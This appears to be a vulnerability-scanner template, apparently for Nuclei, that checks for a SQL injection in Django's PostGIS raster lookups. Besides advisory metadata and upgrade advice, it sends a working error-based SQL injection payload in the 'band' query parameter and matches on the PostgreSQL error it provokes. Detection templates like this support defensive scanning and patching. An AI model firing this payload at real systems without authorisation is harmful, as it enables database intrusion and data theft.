id: vt-2026-1207

info:
  name: "Django - SQL Injection (CVE-2026-1207)"
  author: omarkurt
  severity: high
  description: |
    An issue was discovered in Django 6.0 before 6.0.2, 5.2 before 5.2.11, and 4.2 before 4.2.28.
    Raster lookups on ``RasterField`` (only implemented on PostGIS) allows remote attackers to inject SQL via the band index parameter.
    The vulnerability exists because the band index parameter is concatenated directly into the SQL query without proper sanitization or parameterization when using a GDALRaster as the right-hand side of a lookup.
  impact: |
    Attackers can read, modify, or delete database contents, potentially gaining full system access.
  remediation: |
    Upgrade to Django 6.0.2, 5.2.11, or 4.2.28.
  reference:
    - https://www.djangoproject.com/weblog/2026/feb/03/security-releases/
    - https://github.com/django/django/commit/81aa5292967cd09319c45fe2c1a525ce7b6684d8
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L
    cvss-score: 8.1
    cve-id: CVE-2026-1207
    cwe-id: CWE-89
  tags: sqli,django,postgis,cve,cve-2026

http:
  - method: GET
    path:
      - "{{BaseURL}}/?band=1)%20AND%201=CAST((SELECT%20version())%20AS%20INT)%20--"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "PostgreSQL"
          - "invalid input syntax for type integer"
      - type: status
        status:
          - 500
